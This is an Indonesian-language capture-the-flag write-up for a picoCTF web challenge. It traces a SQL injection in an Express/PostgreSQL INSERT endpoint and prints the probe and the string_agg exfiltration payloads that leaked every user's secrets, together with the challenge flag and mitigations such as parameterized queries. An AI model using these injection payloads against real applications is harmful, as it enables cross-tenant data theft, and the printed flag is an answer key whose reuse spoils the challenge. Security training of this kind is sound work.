# 747 — Secret Box (Web Exploitation, picoCTF 2026, Medium 200 pts)

- **ID / Event:** 747 / picoCTF 2026
- **Kategori / Tingkat:** Web Exploitation / Medium
- **Flag:** `academy{sq1_1nject10n_4cc7170a}`
- **Status:** SOLVED 2026-10-28 (terverifikasi `POST /api/submissions/` -> `correct: true`)

## Deskripsi Skenario & Batasan Lingkungan
Aplikasi Secrets Vault (Express + PostgreSQL via knex) menyimpan rahasia per
pengguna; secret admin di-seed dari ENV `FLAG`. Lab on-demand, source tersedia
(`source.tar.gz`). Hint resmi: SQL injection.

## Teori & Akar Kerentanan (Root Cause)
1. **SQL Injection string interpolation (CWE-89):** `POST /secrets/create`
   menyusun query lewat template literal:
   ``INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')``.
   Parameter `content` yang dikontrol pengguna dievaluasi sebagai SQL, bukan
   bind parameter. Endpoint lain sudah memakai placeholder `?` sehingga hanya
   endpoint ini yang rentan.
2. **Dampak baca lintas-tenant:** subquery skalar `(SELECT string_agg(content,'|')
   FROM secrets)` dieksekusi dalam konteks INSERT dan hasilnya tersimpan
   sebagai secret milik penyerang, lalu dirender di `GET /`.

## Rekonstruksi Pengujian Terstruktur
1. `PUT /api/challenges/747/instance/` -> RUNNING; unduh `source.tar.gz`,
   audit `server.js` menemukan interpolasi di `/secrets/create`.
2. `POST /signup` + `POST /login` akun acak -> cookie `auth_token`.
3. Baseline `content=testprobe` -> HTTP 302 dan muncul di daftar (alur normal).
4. Probing `content=a','b')--` -> HTTP 500 membocorkan query
   `INSERT INTO secrets(owner_id, content) VALUES ('<uuid>', 'a','b')...)`
   (konfirmasi injeksi + format kolom).
5. Eksfiltrasi: `content='||(SELECT string_agg(content,'|') FROM secrets)||'`
   -> HTTP 302; `GET /` memuat `academy{sq1_1nject10n_4cc7170a}|testprobe`.
6. Submit `POST /api/submissions/` -> HTTP 201 `correct: true`; `DELETE` slot instance.

## Token Validasi
`academy{sq1_1nject10n_4cc7170a}` — flag per-instance via ENV; solver live
mengekstrak flag dari halaman secrets pasca-injeksi.

## Takeaway Kompetensi LKS & Mitigasi Defensif
- Selalu pakai parameterized query (`?` / bindings) di semua endpoint;
  larang template literal untuk SQL walau via ORM raw.
- Terapkan least privilege DB + output encoding, dan jangan tampilkan stack
  trace SQL ke klien (gunakan halaman error generik + log server).
- Latihan LKS: audit diff endpoint aman vs rentan dalam satu codebase untuk
  melatih pola deteksi cepat.
